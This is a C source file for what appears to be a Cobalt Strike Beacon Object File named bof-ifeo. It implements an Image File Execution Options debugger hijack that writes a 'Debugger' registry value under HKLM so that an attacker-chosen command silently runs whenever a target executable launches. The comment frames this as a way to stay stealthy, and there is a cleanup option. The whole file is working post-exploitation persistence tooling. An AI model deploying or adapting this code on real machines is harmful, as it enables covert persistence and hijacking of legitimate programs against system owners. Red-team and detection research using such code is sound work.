/*
 * bof-ifeo <exe> <debugger-command|remove>
 *
 * Image File Execution Options debugger hijack.  Creates
 *   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
 *   Options\<exe>
 * and sets the `Debugger` value to the supplied command.  Whenever the target
 * image is launched, Windows starts the debugger instead (the debugger usually
 * launches the original image as a child to keep the behavior stealthy).
 *
 * `remove` deletes the IFEO key.  Requires administrator rights.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define IFEO_ROOT "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"

static const char *base_name(const char *path)
{
    const char *p = path, *last = path;
    for (; *p; p++)
        if (*p == '\\' || *p == '/') last = p + 1;
    return last;
}

void go(char *args, int alen)
{
    datap parser;
    char *exe, *command;
    int elen, clen;
    char keypath[1024];
    HKEY key = NULL;
    DWORD disp = 0;
    LONG rc;
    int remove;

    BeaconDataParse(&parser, args, alen);
    exe     = BeaconDataExtract(&parser, &elen);
    command = BeaconDataExtract(&parser, &clen);
    if (!exe || !exe[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: ifeo <exe> <debugger-command|remove>\n");
        return;
    }
    remove = bof_stricmp(command, "remove") == 0 ||
             bof_stricmp(command, "delete") == 0;

    bof_strncpy(keypath, IFEO_ROOT, sizeof(keypath));
    bof_strncat(keypath, base_name(exe), sizeof(keypath) - bof_strlen(keypath) - 1);

    if (remove) {
        rc = ADVAPI32$RegDeleteTreeA(HKEY_LOCAL_MACHINE, keypath);
        if (rc == ERROR_SUCCESS || rc == ERROR_FILE_NOT_FOUND)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] IFEO key removed: %s\n", keypath);
        else
            BeaconPrintf(CALLBACK_ERROR, "RegDeleteTree failed: %lu\n",
                         (unsigned long)rc);
        return;
    }

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, keypath, 0, NULL, 0,
                                  KEY_WRITE, NULL, &key, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %lu (admin?)\n",
                     (unsigned long)rc);
        return;
    }
    rc = ADVAPI32$RegSetValueExA(key, "Debugger", 0, REG_SZ,
                                 (const BYTE *)command,
                                 (DWORD)bof_strlen(command) + 1);
    ADVAPI32$RegCloseKey(key);

    if (rc == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] IFEO debugger set\n");
        BeaconPrintf(CALLBACK_OUTPUT, "    key     : HKLM\\%s\n", keypath);
        BeaconPrintf(CALLBACK_OUTPUT, "    debugger: %s\n", command);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] undo: ifeo %s remove\n", exe);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx failed: %lu\n",
                     (unsigned long)rc);
    }
}
